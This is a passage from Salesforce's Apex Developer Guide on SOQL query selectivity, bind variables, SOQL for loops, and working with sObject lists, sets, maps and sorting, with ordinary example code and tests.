**–** Foreign keys (lookup or master-detail relationship fields)

**–** Audit dates (CreatedDate and SystemModstamp fields)

**–** RecordType fields (indexed for all standard objects that feature them)

**–** Custom fields that are marked as External ID or Unique

**•** Fields not indexed by default are automatically indexed when the Salesforce optimizer recognizes that an index can improve
performance for frequently run queries.

**•** Salesforce Support can add custom indexes on request for customers.

**•** A custom index can't be created on these types of fields: multi-select picklists, currency fields in a multicurrency organization,
long text fields, some formula fields, and binary fields (fields of type blob, file, or encrypted text.) New data types, typically complex
ones, are periodically added to Salesforce, and fields of these types don’t always allow custom indexing.

**•** You can’t create custom indexes on formula fields that include invocations of the `TEXT` function on picklist fields.

**•** Typically, a custom index isn’t used in these cases.

**–** The queried values exceed the system-defined threshold.

**–** The filter operator is a negative operator such as `NOT EQUAL TO` (or `!=` ), `NOT CONTAINS`, and `NOT STARTS`
`WITH` .

**–** The `CONTAINS` operator is used in the filter, and the number of rows to be scanned exceeds 333,333. The `CONTAINS`
operator requires a full scan of the index. This threshold is subject to change.

**–** You’re comparing with an empty value ( `Name != ''` ).

However, there are other complex scenarios in which custom indexes can’t be used. Contact your Salesforce representative if
your scenario isn't covered by these cases or if you need further assistance with non-selective queries.

**Examples of Selective SOQL Queries**
To better understand whether a query on a large object is selective or not, let's analyze some queries. For these queries, assume that
there are more than 1 million records for the Account sObject. These records include soft-deleted records, that is, deleted records
that are still in the Recycle Bin.

Query 1:

```
     SELECT Id FROM Account WHERE Id IN (<list of account IDs>)

```

The `WHERE` clause is on an indexed field (Id). If `SELECT COUNT() FROM Account WHERE Id IN (<list of`
`account IDs>)` returns fewer records than the selectivity threshold, the index on `Id` is used. This index is typically used when
the list of IDs contains only a few records.

Query 2:

```
     SELECT Id FROM Account WHERE Name != ''

```

Since Account is a large object even though Name is indexed (primary key), this filter returns most of the records, making the query
non-selective.

Query 3:

```
     SELECT Id FROM Account WHERE Name != '' AND CustomField__c = 'ValueA'

```


Apex Developer Guide Working with Data in Apex

Here we have to see if any filter, when considered individually, is selective. As we saw in the previous example, the first filter isn't
selective. So let's focus on the second one. If the count of records returned by `SELECT COUNT() FROM Account WHERE`
`CustomField__c = 'ValueA'` is lower than the selectivity threshold, and CustomField__c is indexed, the query is selective.

##### Using SOQL Queries That Return One Record

SOQL queries can be used to assign a single sObject value when the result list contains only one element.

When the L-value of an expression is a single sObject type, Apex automatically assigns the single sObject record in the query result list
to the L-value. A runtime exception results if zero sObjects or more than one sObject is found in the list. For example:

```
   List<Account> accts = [SELECT Id FROM Account];

   // These lines of code are only valid if one row is returned from

   // the query. Notice that the second line dereferences the field from the

   // query without assigning it to an intermediary sObject variable.

   Account acct = [SELECT Id FROM Account];

   String name = [SELECT Name FROM Account].Name;

```

This usage is supported with the following Apex types, methods, or operators:

**•** `Database.query` method.

**•** [Safe Navigation Operator. See Safe Navigation Operator.](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexcode.meta/apexcode/langCon_apex_SafeNavigationOperator.htm)

**•** [Null Coalescing Operator. See Null Coalescing Operator.](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexcode.meta/apexcode/langCon_apex_NullCoalescingOperator.htm)

**•** `Map.values` .

Warning: Although currently supported, Salesforce recommends against using this feature with `Map.values` .

##### Improve Performance by Avoiding Null Values

In your SOQL and SOSL queries, explicitly filtering out null values in the WHERE clause allows Salesforce to improve query performance.
In the following example, any records where the `Thread__c` value is null are eliminated from the search.

```
   Public class TagWS {

   /* getThreadTags

   *

   * a quick method to pull tags not in the existing list

   *

   */

     public static webservice List<String>

     getThreadTags(String threadId, List<String> tags) {

       system.debug(LoggingLevel.Debug,tags);

       List<String> retVals = new List<String>();

       Set<String> tagSet = new Set<String>();

       Set<String> origTagSet = new Set<String>();

       origTagSet.addAll(tags);

   // Note WHERE clause optimizes search where Thread__c is not null

       for(CSO_CaseThread_Tag__c t :

```


Apex Developer Guide Working with Data in Apex

```
         [SELECT Name FROM CSO_CaseThread_Tag__c

         WHERE Thread__c = :threadId AND

         Thread__c != null])

       {

         tagSet.add(t.Name);

       }

       for(String x : origTagSet) {

     // return a minus version of it so the UI knows to clear it

         if(!tagSet.contains(x)) retVals.add('-' + x);

       }

       for(String x : tagSet) {

     // return a plus version so the UI knows it's new

         if(!origTagSet.contains(x)) retvals.add('+' + x);

       }

       return retVals;

     }

   }

##### Working with Polymorphic Relationships in SOQL Queries

```

A polymorphic relationship is a relationship between objects where a referenced object can be one of several different types. For example,
the `Who` relationship field of a Task can be a Contact or a Lead.

The following describes how to use SOQL queries with polymorphic relationships in Apex. If you want more general information on
[polymorphic relationships, see Understanding Relationship Fields and Polymorphic Fields in the SOQL and SOSL Reference.](https://developer.salesforce.com/docs/atlas.en-us.262.0.soql_sosl.meta/soql_sosl/sforce_api_calls_soql_relationships_and_polymorph_keys.htm)

You can use SOQL queries that reference polymorphic fields in Apex to get results that depend on the object type referenced by the
polymorphic field. One approach is to filter your results using the `Type` qualifier. This example queries Events that are related to an
Account or Opportunity via the What field.

```
   List<Event> events = [SELECT Description FROM Event WHERE What.Type IN ('Account',

   'Opportunity')];

```

Another approach would be to use the `TYPEOF` clause in the SOQL `SELECT` statement. This example also queries Events that are
related to an Account or Opportunity via the What field.

```
   List<Event> events = [SELECT TYPEOF What WHEN Account THEN Phone WHEN Opportunity THEN

   Amount END FROM Event];

```

These queries return a list of sObjects where the relationship field references the desired object types.

If you need to access the referenced object in a polymorphic relationship, you can use the instanceof keyword to determine the object
type. The following example uses `instanceof` to determine whether an Account or Opportunity is related to an Event.

```
   Event myEvent = eventFromQuery;

   if (myEvent.What instanceof Account) {

      // myEvent.What references an Account, so process accordingly

   } else if (myEvent.What instanceof Opportunity) {

      // myEvent.What references an Opportunity, so process accordingly

   }

```

Note that you must assign the referenced sObject that the query returns to a variable of the appropriate type before you can pass it to
another method. The following example

**1.** Queries for User or Group owners of Merchandise__c custom objects using a SOQL query with a `TYPEOF` clause


Apex Developer Guide Working with Data in Apex

**2.** Uses `instanceof` to determine the owner type

**3.** Assigns the owner objects to User or Group type variables before passing them to utility methods

```
   public class PolymorphismExampleClass {

      // Utility method for a User

      public static void processUser(User theUser) {

        System.debug('Processed User');

      }

      // Utility method for a Group

      public static void processGroup(Group theGroup) {

        System.debug('Processed Group');

      }

      public static void processOwnersOfMerchandise() {

        // Select records based on the Owner polymorphic relationship field

        List<Merchandise__c> merchandiseList = [SELECT TYPEOF Owner WHEN User THEN LastName

    WHEN Group THEN Email END FROM Merchandise__c];

        // We now have a list of Merchandise__c records owned by either a User or Group

        for (Merchandise__c merch: merchandiseList) {

           // We can use instanceof to check the polymorphic relationship type

           // Note that we have to assign the polymorphic reference to the appropriate

           // sObject type before passing to a method

           if (merch.Owner instanceof User) {

             User userOwner = merch.Owner;

             processUser(userOwner);

           } else if (merch.Owner instanceof Group) {

             Group groupOwner = merch.Owner;

             processGroup(groupOwner);

           }

        }

      }

   }

##### Using Apex Variables in SOQL and SOSL Queries

```

SOQL and SOSL statements in Apex can reference Apex code variables and expressions if they’re preceded by a colon ( `:` ). This use of a
local code variable within a SOQL or SOSL statement is called a _bind_ . The Apex parser first evaluates the local variable in code context
before executing the SOQL or SOSL statement. Bind expressions can be used as:

**•** The search string in `FIND` clauses.

**•** The filter literals in `WHERE` clauses.

**•** The value of the `IN` or `NOT IN` operator in `WHERE` clauses, allowing filtering on a dynamic set of values. Note that this is of
particular use with a list of IDs or Strings, though it works with lists of any type.

**•** The division names in `WITH DIVISION` clauses.

**•** The numeric value in `LIMIT` clauses.

**•** The numeric value in `OFFSET` clauses.

For example:

```
   Account A = new Account(Name='xxx');

   insert A;

```


Apex Developer Guide Working with Data in Apex

```
   Account B;

   // A simple bind

   B = [SELECT Id FROM Account WHERE Id = :A.Id];

   // A bind with arithmetic

   B = [SELECT Id FROM Account

      WHERE Name = :('x' + 'xx')];

   String s = 'XXX';

   // A bind with expressions

   B = [SELECT Id FROM Account

      WHERE Name = :'XXXX'.substring(0,3)];

   // A bind with INCLUDES clause

   B = [SELECT Id FROM Account WHERE :A.TYPE INCLUDES (‘Customer – Direct; Customer –

   Channel’)];

   // A bind with an expression that is itself a query result

   B = [SELECT Id FROM Account

      WHERE Name = :[SELECT Name FROM Account

               WHERE Id = :A.Id].Name];

   Contact C = new Contact(LastName='xxx', AccountId=A.Id);

   insert new Contact[]{C, new Contact(LastName='yyy',

                         accountId=A.id)};

   // Binds in both the parent and aggregate queries

   B = [SELECT Id, (SELECT Id FROM Contacts

              WHERE Id = :C.Id)

      FROM Account

      WHERE Id = :A.Id];

   // One contact returned

   Contact D = B.Contacts;

   // A limit bind

   Integer i = 1;

   B = [SELECT Id FROM Account LIMIT :i];

   // An OFFSET bind

   Integer offsetVal = 10;

   List<Account> offsetList = [SELECT Id FROM Account OFFSET :offsetVal];

   // An IN-bind with an Id list. Note that a list of sObjects

   // can also be used--the Ids of the objects are used for

   // the bind

   Contact[] cc = [SELECT Id FROM Contact LIMIT 2];

   Task[] tt = [SELECT Id FROM Task WHERE WhoId IN :cc];

   // An IN-bind with a String list

   String[] ss = new String[]{'a', 'b'};

   Account[] aa = [SELECT Id FROM Account

```


Apex Developer Guide Working with Data in Apex

```
             WHERE AccountNumber IN :ss];

   // A SOSL query with binds in all possible clauses

   String myString1 = 'aaa';

   String myString2 = 'bbb';

   Integer myInt3 = 11;

   String myString4 = 'ccc';

   Integer myInt5 = 22;

   List<List<SObject>> searchList = [FIND :myString1 IN ALL FIELDS

                        RETURNING

                          Account (Id, Name WHERE Name LIKE :myString2

                               LIMIT :myInt3),

                          Contact,

                          Opportunity,

                          Lead

                        WITH DIVISION =:myString4

                        LIMIT :myInt5];

```

Note: Apex bind variables aren’t supported for the units parameter in the `DISTANCE` function. This query doesn’t work.

```
      String units = 'mi';

      List<Account> accountList =

        [SELECT ID, Name, BillingLatitude, BillingLongitude

         FROM Account

         WHERE DISTANCE(My_Location_Field__c, GEOLOCATION(10,10), :units) < 10];

##### Querying All Records with a SOQL Statement

```

SOQL statements can use the `ALL ROWS` keywords to query all records in an organization, including deleted records and archived
activities. For example:

```
   System.assertEquals(2, [SELECT COUNT() FROM Contact WHERE AccountId = a.Id ALL ROWS]);

```

You can use `ALL ROWS` to query records in your organization's Recycle Bin. You cannot use the `ALL ROWS` keywords with the `FOR`
`UPDATE` keywords.

#### SOQL For Loops SOQL for loops iterate over all of the sObject records returned by a SOQL query.

The syntax of a SOQL `for` loop is either:

```
   for ( variable : [ soql_query ]) {

     code_block

   }

```

or

```
   for ( variable_list : [ soql_query ]) {

     code_block

   }

```


Apex Developer Guide Working with Data in Apex

Both _**`variable`**_ and _**`variable_list`**_ must be of the same type as the sObjects that are returned by the _**`soql_query`**_ .
As in standard SOQL queries, the `[` _**`soql_query`**_ `]` statement can refer to code expressions in their `WHERE` clauses using the `:`
syntax. For example:

```
   String s = 'Acme';

   for (Account a : [SELECT Id, Name from Account

              where Name LIKE :(s+'%')]) {

      // Your code

   }

```

The following example combines creating a list from a SOQL query, with the DML `update` method.

```
   // Create a list of account records from a SOQL query

   List<Account> accs = [SELECT Id, Name FROM Account WHERE Name = 'Siebel'];

   // Loop through the list and update the Name field

   for(Account a : accs){

     a.Name = 'Oracle';

   }

   // Update the database

   update accs;

```

SOQL For Loops Versus Standard SOQL Queries

SOQL `for` loops differ from standard SOQL statements because of the method they use to retrieve sObjects. While the standard queries
discussed in SOQL and SOSL Queries can retrieve either the `count` of a query or a number of object records, SOQL `for` loops retrieve
all sObjects, using efficient chunking with calls to the `query` and `queryMore` methods of SOAP API. Developers can avoid the limit
on heap size by using a SOQL `for` loop to process query results that return multiple records. However, this approach can result in more
CPU cycles being used. See Total heap size.

Queries including an aggregate function don't support `queryMore` . A run-time exception occurs if you use a query containing an
aggregate function that returns more than 2,000 rows in a `for` loop.

[For fine-grained control over the results of a SOQL query, consider using Apex cursors. See Apex Cursors.](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexcode.meta/apexcode/apex_cursors.htm)

SOQL For Loop Formats

SOQL `for` loops can process records one at a time using a single sObject variable, or in batches of 200 sObjects at a time using an
sObject list:

**•** The single sObject format executes the `for` loop's `<code_block>` one time per sObject record. Consequently, it’s easy to
understand and use, but is grossly inefficient if you want to use data manipulation language (DML) statements within the `for` loop
body. Each DML statement ends up processing only one sObject at a time.

**•** The sObject list format executes the `for` loop's `<code_block>` one time per list of 200 sObjects. Consequently, it’s a little more
difficult to understand and use, but is the optimal choice if you must use DML statements within the `for` loop body. Each DML
statement can bulk process a list of sObjects at a time.

For example, the following code illustrates the difference between the two types of SOQL query `for` loops:

```
   // Create a savepoint because the data should not be committed to the database

   Savepoint sp = Database.setSavepoint();

   insert new Account[]{new Account(Name = 'yyy'),

                new Account(Name = 'yyy'),

```


Apex Developer Guide Working with Data in Apex

```
                new Account(Name = 'yyy')};

   // The single sObject format executes the for loop once per returned record

   Integer i = 0;

   for (Account tmp : [SELECT Id FROM Account WHERE Name = 'yyy']) {

      i++;

   }

   System.assert(i == 3); // Since there were three accounts named 'yyy' in the

                 // database, the loop executed three times

   // The sObject list format executes the for loop once per returned batch

   // of records

   i = 0;

   Integer j;

   for (Account[] tmp : [SELECT Id FROM Account WHERE Name = 'yyy']) {

      j = tmp.size();

      i++;

   }

   System.assert(j == 3); // The lt should have contained the three accounts

                 // named 'yyy'

   System.assert(i == 1); // Since a single batch can hold up to 200 records and,

                 // only three records should have been returned, the

                 // loop should have executed only once

   // Revert the database to the original state

   Database.rollback(sp);

```

Note:

**•** The `break` and `continue` keywords can be used in both types of inline query `for` loop formats. When using the sObject
list format, `continue` skips to the next list of sObjects.

**•** DML statements can only process up to 10,000 records at a time, and sObject list `for` loops process records in batches of
200. Consequently, if you’re inserting, updating, or deleting more than one record per returned record in an sObject list `for`
loop, it’s possible to encounter runtime limit’s errors. See Execution Governors and Limits.

**•** You may get a `QueryException` in a SOQL `for` loop with the message `Aggregate query has too many`
`rows for direct assignment, use FOR loop` . This exception is sometimes thrown when accessing a large
set of child records (200 or more) of a retrieved sObject inside the loop, or when getting the size of such a record set. For
example, the query in the following SOQL `for` loop retrieves child contacts for a particular account. If this account contains
more than 200 child contacts, the statements in the `for` loop cause an exception.

```
       for (Account acct : [SELECT Id, Name, (SELECT Id, Name FROM Contacts)

                   FROM Account WHERE Id IN ('<ID value>')]) {

          List<Contact> contactList = acct.Contacts; // Causes an error

          Integer count = acct.Contacts.size(); // Causes an error

         // Note: If JSON.serialize() is used here on acct, the resulting JSON won't have

        the complete set of Contacts

       }

```

To avoid getting this exception, use a `for` loop to iterate over the child records, as follows.

```
       for (Account acct : [SELECT Id, Name, (SELECT Id, Name FROM Contacts)

                   FROM Account WHERE Id IN ('<ID value>')]) {

          Integer count=0;

          for (Contact c : acct.Contacts) {

```


Apex Developer Guide Working with Data in Apex

```
            count++;

          }

       }

```

In this example, if `JSON.serialize()` is used on _`acct`_, only the records that have been retrieved so far will be returned
and serialized. Because the Apex SOQL for-loop mechanism is designed to minimize the amount of heap usage by keeping
only a subset of the record data in memory, the complete sObject and any subquery sObjects will not be available to obtain
complete serialization.

#### sObject Collections

You can manage sObjects in lists, sets, and maps.

##### Lists of sObjects

Lists can contain sObjects among other types of elements. Lists of sObjects can be used for bulk processing of data.

Sorting Lists of sObjects
Using the `List.sort` method, you can sort lists of sObjects.

Expanding sObject and List Expressions

Sets of Objects
Sets can contain sObjects among other types of elements.

Maps of sObjects
Map keys and values can be of any data type, including sObject types, such as Account.

##### Lists of sObjects

Lists can contain sObjects among other types of elements. Lists of sObjects can be used for bulk processing of data.

You can use a list to store sObjects. Lists are useful when working with SOQL queries. SOQL queries return sObject data and this data
can be stored in a list of sObjects. Also, you can use lists to perform bulk operations, such as inserting a list of sObjects with one call.

##### To declare a list of sObjects, use the List keyword followed by the sObject type within <> characters. For example:

```
   // Create an empty list of Accounts

   List<Account> myList = new List<Account>();

```

Auto-populating a List from a SOQL Query

You can assign a List variable directly to the results of a SOQL query. The SOQL query returns a new list populated with the records
returned. Make sure that the declared List variable contains the same sObject that is being queried. Or you can use the generic sObject
data type.

This example shows how to declare and assign a list of accounts to the return value of a SOQL query. The query returns up to 1,000
returns account records containing the Id and Name fields.

```
   // Create a list of account records from a SOQL query

   List<Account> accts = [SELECT Id, Name FROM Account LIMIT 1000];

```


Apex Developer Guide Working with Data in Apex

Adding and Retrieving List Elements

As with lists of primitive data types, you can access and set elements of sObject lists using the `List` methods provided by Apex. For
example:

```
   List<Account> myList = new List<Account>(); // Define a new list

   Account a = new Account(Name='Acme'); // Create the account first

   myList.add(a); // Add the account sObject

   Account a2 = myList.get(0); // Retrieve the element at index 0

```

Bulk Processing

You can bulk-process a list of sObjects by passing a list to the DML operation. This example shows how you can insert a list of accounts.

```
   // Define the list

   List<Account> acctList = new List<Account>();

   // Create account sObjects

   Account a1 = new Account(Name='Account1');

   Account a2 = new Account(Name='Account2');

   // Add accounts to the list

   acctList.add(a1);

   acctList.add(a2);

   // Bulk insert the list

   insert acctList;

```

Note: If you perform a bulk insert of Knowledge article versions, make the ownerId of all records the same.

Record ID Generation

Apex automatically generates IDs for each object in an sObject list that was inserted or upserted using DML. Therefore, a list that contains
more than one instance of an sObject cannot be inserted or upserted even if it has a `null` ID. This situation would imply that two IDs
would need to be written to the same structure in memory, which is illegal.

For example, the `insert` statement in the following block of code generates a `ListException` because it tries to insert a list
with two references to the same sObject ( `a` ):

```
   try {

     // Create a list with two references to the same sObject element

     Account a = new Account();

     List<Account> accs = new List<Account>{a, a};

     // Attempt to insert it...

     insert accs;

     // Will not get here

     System.assert(false);

   } catch (ListException e) {

     // But will get here

   }

```

Using Array Notation for One-Dimensional Lists of sObjects

Alternatively, you can use the array notation (square brackets) to declare and reference lists of sObjects.


Apex Developer Guide Working with Data in Apex

This example declares a list of accounts using the array notation.

```
   Account[] accts = new Account[1];

```

This example adds an element to the list using square brackets.

```
   accts[0] = new Account(Name='Acme2');

```

These examples also use the array notation with sObject lists.

**Example** **Description**

Defines an Account list with no elements.
```
    List<Account> accts = new Account[]{};

```

```
List<Account> accts = new Account[]

     {new Account(), null, new

Account()};

```

Defines an Account list with memory allocated for three Accounts:
a new Account object in the first position, `null` in the second,
and another new Account object in the third.

Defines the Contact list with a new list.
```
 List<Contact> contacts = new List<Contact>

 (otherList);

##### Sorting Lists of sObjects

```

Using the `List.sort` method, you can sort lists of sObjects.

For sObjects, sorting is in ascending order and uses a sequence of comparison steps outlined in the next section. You can create a custom
sort order for sObjects by wrapping your sObject in an Apex class that implements the `Comparable` interface. You can also create a
custom sort order by passing a class that implements `Comparator` as a parameter to the sort method. See Custom Sort Order of
sObjects.

Default Sort Order of sObjects

The `List.sort` method sorts sObjects in ascending order and compares sObjects using an ordered sequence of steps that specify
the labels or fields used. The comparison starts with the first step in the sequence and ends when two sObjects are sorted using specified
labels or fields. The following is the comparison sequence used:

**1.** The label of the sObject type.

For example, an Account sObject appears before a Contact.

**2.** The Name field, if applicable.

For example, if the list contains two accounts named Alpha and Beta, account Alpha comes before account Beta.

**3.** Standard fields, starting with the fields that come first in alphabetical order, except for the Id and Name fields.

For example, if two accounts have the same name, the first standard field used for sorting is AccountNumber.

**4.** Custom fields, starting with the fields that come first in alphabetical order.

For example, suppose two accounts have the same name and identical standard fields, and there are two custom fields, FieldA and
FieldB, the value of FieldA is used first for sorting.


Apex Developer Guide Working with Data in Apex

Not all steps in this sequence are necessarily carried out. For example, a list containing two sObjects of the same type and with unique
Name values is sorted based on the Name field and sorting stops at step 2. Otherwise, if the names are identical or the sObject doesn’t
have a Name field, sorting proceeds to step 3 to sort by standard fields.

For text fields, the sort algorithm uses the Unicode sort order. Also, empty fields precede non-empty fields in the sort order.

Here’s an example of sorting a list of Account sObjects. This example shows how the Name field is used to place the Acme account
ahead of the two sForce accounts in the list. Since there are two accounts named sForce, the Industry field is used to sort these remaining
accounts because the Industry field comes before the Site field in alphabetical order.

```
   Account[] acctList = new List<Account>();

   acctList.add( new Account(

      Name='sForce',

      Industry='Biotechnology',

      Site='Austin'));

   acctList.add(new Account(

      Name='sForce',

      Industry='Agriculture',

      Site='New York'));

   acctList.add(new Account(

      Name='Acme'));

   System.debug(acctList);

   acctList.sort();

   Assert.areEqual('Acme', acctList[0].Name);

   Assert.areEqual('sForce', acctList[1].Name);

   Assert.areEqual('Agriculture', acctList[1].Industry);

   Assert.areEqual('sForce', acctList[2].Name);

   Assert.areEqual('Biotechnology', acctList[2].Industry);

   System.debug(acctList);

```

This example is similar to the previous one, except that it uses the Merchandise__c custom object. This example shows how the Name
field is used to place the Notebooks merchandise ahead of Pens in the list. Because there are two merchandise sObjects with the Name
field value of Pens, the Description field is used to sort these remaining merchandise items. The Description field is used for sorting
because it comes before the Price and Total_Inventory fields in alphabetical order.

```
   Merchandise__c[] merchList = new List<Merchandise__c>();

   merchList.add( new Merchandise__c(

      Name='Pens',

      Description__c='Red pens',

      Price__c=2,

      Total_Inventory__c=1000));

   merchList.add( new Merchandise__c(

      Name='Notebooks',

      Description__c='Cool notebooks',

      Price__c=3.50,

      Total_Inventory__c=2000));

   merchList.add( new Merchandise__c(

      Name='Pens',

      Description__c='Blue pens',

      Price__c=1.75,

      Total_Inventory__c=800));

   System.debug(merchList);

   merchList.sort();

   Assert.areEqual('Notebooks', merchList[0].Name);

```


Apex Developer Guide Working with Data in Apex

```
   Assert.areEqual('Pens', merchList[1].Name);

   Assert.areEqual('Blue pens', merchList[1].Description__c);

   Assert.areEqual('Pens', merchList[2].Name);

   Assert.areEqual('Red pens', merchList[2].Description__c);

   System.debug(merchList);

```

Custom Sort Order of sObjects

To create a custom sort order for sObjects in lists, implement the `Comparator` interface and pass it as a parameter to the `List.sort`
method.

Alternatively, create a wrapper class for the sObject and implement the `Comparable` interface. The wrapper class contains the sObject
in question and implements the `Comparable.compareTo` method in which you specify the sort logic.

Example: This example implements the `Comparator` interface to compare two opportunities based on the Amount field.

```
      public class OpportunityComparator implements Comparator<Opportunity> {

        public Integer compare(Opportunity o1, Opportunity o2) {

           // The return value of 0 indicates that both elements are equal.

           Integer returnValue = 0;

           if(o1 == null && o2 == null) {

             returnValue = 0;

           } else if(o1 == null) {

             // nulls-first implementation

             returnValue = -1;

           } else if(o2 == null) {

             // nulls-first implementation

             returnValue = 1;

           } else if ((o1.Amount == null) && (o2.Amount == null)) {

             // both have null Amounts

             returnValue = 0;

           } else if (o1.Amount == null){

             // nulls-first implementation

             returnValue = -1;

           } else if (o2.Amount == null){

             // nulls-first implementation

             returnValue = 1;

           } else if (o1.Amount < o2.Amount) {

             // Set return value to a negative value.

             returnValue = -1;

           } else if (o1.Amount > o2.Amount) {

             // Set return value to a positive value.

             returnValue = 1;

           }

           return returnValue;

        }

      }

```

This test sorts a list of `Comparator` objects and verifies that the list elements are sorted by the opportunity amount.

```
      @isTest

      private class OpportunityComparator_Test {

        @isTest

```


Apex Developer Guide Working with Data in Apex

```
        static void sortViaComparator() {

           // Add the opportunity wrapper objects to a list.

           List<Opportunity> oppyList = new List<Opportunity>();

           Date closeDate = Date.today().addDays(10);

           oppyList.add( new Opportunity(

             Name='Edge Installation',

             CloseDate=closeDate,

             StageName='Prospecting',

             Amount=50000));

           oppyList.add( new Opportunity(

             Name='United Oil Installations',

             CloseDate=closeDate,

             StageName='Needs Analysis',

             Amount=100000));

           oppyList.add( new Opportunity(

             Name='Grand Hotels SLA',

             CloseDate=closeDate,

             StageName='Prospecting',

             Amount=25000));

           oppyList.add(null);

           // Sort the objects using the Comparator implementation

           oppyList.sort(new OpportunityComparator());

           // Verify the sort order

           Assert.isNull(oppyList[0]);

           Assert.areEqual('Grand Hotels SLA', oppyList[1].Name);

           Assert.areEqual(25000, oppyList[1].Amount);

           Assert.areEqual('Edge Installation', oppyList[2].Name);

           Assert.areEqual(50000, oppyList[2].Amount);

           Assert.areEqual('United Oil Installations', oppyList[3].Name);

           Assert.areEqual(100000, oppyList[3].Amount);

           // Write the sorted list contents to the debug log.

           System.debug(oppyList);

        }

      }

```

Example: This example shows how to create a wrapper `Comparable` class for Opportunity. The implementation of the
`compareTo` method in this class compares two opportunities based on the Amount field—the class member variable contained
in this instance, and the opportunity object passed into the method.

```
      public class OpportunityWrapper implements Comparable {

        public Opportunity oppy;

        // Constructor

        public OpportunityWrapper(Opportunity op) {

         // Guard against wrapping a null

         if(op == null) {

         Exception ex = new NullPointerException();

         ex.setMessage('Opportunity argument cannot be null');

         throw ex;

         }

           oppy = op;

        }

```


Apex Developer Guide Working with Data in Apex

```
        // Compare opportunities based on the opportunity amount.

        public Integer compareTo(Object compareTo) {

           // Cast argument to OpportunityWrapper

           OpportunityWrapper compareToOppy = (OpportunityWrapper)compareTo;

           // The return value of 0 indicates that both elements are equal.

           Integer returnValue = 0;

           if ((oppy.Amount == null) && (compareToOppy.oppy.Amount == null)) {

             // both wrappers have null Amounts

             returnValue = 0;

           } else if ((oppy.Amount == null) && (compareToOppy.oppy.Amount != null)){

             // nulls-first implementation

             returnValue = -1;

           } else if ((oppy.Amount != null) && (compareToOppy.oppy.Amount == null)){

             // nulls-first implementation

             returnValue = 1;

           } else if (oppy.Amount > compareToOppy.oppy.Amount) {

             // Set return value to a positive value.

             returnValue = 1;

           } else if (oppy.Amount < compareToOppy.oppy.Amount) {

             // Set return value to a negative value.

             returnValue = -1;

           }

           return returnValue;

        }

      }

```

This test sorts a list of `OpportunityWrapper` objects and verifies that the list elements are sorted by the opportunity amount.

```
      @isTest

      private class OpportunityWrapperTest {

        static testmethod void test1() {

           // Add the opportunity wrapper objects to a list.

           OpportunityWrapper[] oppyList = new List<OpportunityWrapper>();

           Date closeDate = Date.today().addDays(10);

           oppyList.add( new OpportunityWrapper(new Opportunity(

             Name='Edge Installation',

             CloseDate=closeDate,

             StageName='Prospecting',

             Amount=50000)));

           oppyList.add( new OpportunityWrapper(new Opportunity(

             Name='United Oil Installations',

             CloseDate=closeDate,

             StageName='Needs Analysis',

             Amount=100000)));

           oppyList.add( new OpportunityWrapper(new Opportunity(

             Name='Grand Hotels SLA',

             CloseDate=closeDate,

             StageName='Prospecting',

             Amount=25000)));

           // Sort the wrapper objects using the implementation of the

           // compareTo method.

           oppyList.sort();

```


Apex Developer Guide Working with Data in Apex

```
           // Verify the sort order

           Assert.areEqual('Grand Hotels SLA', oppyList[0].oppy.Name);

           Assert.areEqual(25000, oppyList[0].oppy.Amount);

           Assert.areEqual('Edge Installation', oppyList[1].oppy.Name);

           Assert.areEqual(50000, oppyList[1].oppy.Amount);

           Assert.areEqual('United Oil Installations', oppyList[2].oppy.Name);

           Assert.areEqual(100000, oppyList[2].oppy.Amount);

           // Write the sorted list contents to the debug log.

           System.debug(oppyList);

        }

      }

```

SEE ALSO:

_[Apex Reference Guide](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_class_System_Collator.htm)_ : Collator Class

_Apex Reference Guide_ [: Comparable Interface](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_comparable.htm)

_Apex Reference Guide_ [: Comparator Interface](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_interface_System_Comparator.htm)

##### Expanding sObject and List Expressions

As in Java, sObject and list expressions can be expanded with method references and list expressions, respectively, to form new expressions.

In the following example, a new variable containing the length of the new account name is assigned to `acctNameLength` .

```
   Integer acctNameLength = new Account[]{new Account(Name='Acme')}[0].Name.length();

```

In the above, `new Account[]` generates a list.

The list is populated with one element by the `new` statement `{new Account(name='Acme')}` .

Item 0, the first item in the list, is then accessed by the next part of the string `[0]` .

The name of the sObject in the list is accessed, followed by the method returning the length `name.length()` .

In the following example, a name that has been shifted to lower case is returned. The SOQL statement returns a list of which the first
element (at index 0) is accessed through `[0]` . Next, the Name field is accessed and converted to lowercase with this expression
`.Name.toLowerCase()` .

```
   String nameChange = [SELECT Name FROM Account][0].Name.toLowerCase();

##### Sets of Objects

```

Sets can contain sObjects among other types of elements.

Sets contain unique elements. Uniqueness of sObjects is determined by comparing the objects’ fields. For example, if you try to add two
accounts with the same name to a set, with no other fields set, only one sObject is added to the set.

```
   // Create two accounts, a1 and a2

   Account a1 = new account(name='MyAccount');

   Account a2 = new account(name='MyAccount');

   // Add both accounts to the new set

   Set<Account> accountSet = new Set<Account>{a1, a2};

```


Apex Developer Guide Working with Data in Apex

```
   // Verify that the set only contains one item

   System.assertEquals(accountSet.size(), 1);

```

If you add a description to one of the accounts, it is considered unique and both accounts are added to the set.

```
   // Create two accounts, a1 and a2, and add a description to a2

   Account a1 = new account(name='MyAccount');

   Account a2 = new account(name='MyAccount', description='My test account');

   // Add both accounts to the new set

   Set<Account> accountSet = new Set<Account>{a1, a2};

   // Verify that the set contains two items

   System.assertEquals(accountSet.size(), 2);

```

Warning: If set elements are objects, and these objects change after being added to the collection, they won’t be found anymore
when using, for example, the `contains` or `containsAll` methods, because of changed field values.

##### Maps of sObjects

Map keys and values can be of any data type, including sObject types, such as Account.

Maps can hold sObjects both in their keys and values. A map key represents a unique value that maps to a map value. For example, a
common key would be an ID that maps to an account (a specific sObject type). This example shows how to define a map whose keys
are of type ID and whose values are of type Account.

```
   Map<ID, Account> m = new Map<ID, Account>();

```

As with primitive types, you can populate map key-value pairs when the map is declared by using curly brace ( `{}` ) syntax. Within the
curly braces, specify the key first, then specify the value for that key using `=>` . This example creates a map of integers to accounts lists
and adds one entry using the account list created earlier.

```
   Account[] accs = new Account[5]; // Account[] is synonymous with List<Account>

   Map<Integer, List<Account>> m4 = new Map<Integer, List<Account>>{1 => accs};

```

Maps allow sObjects in their keys. You must use sObjects in the keys only when the sObject field values won’t change.

Auto-Populating Map Entries from a SOQL Query

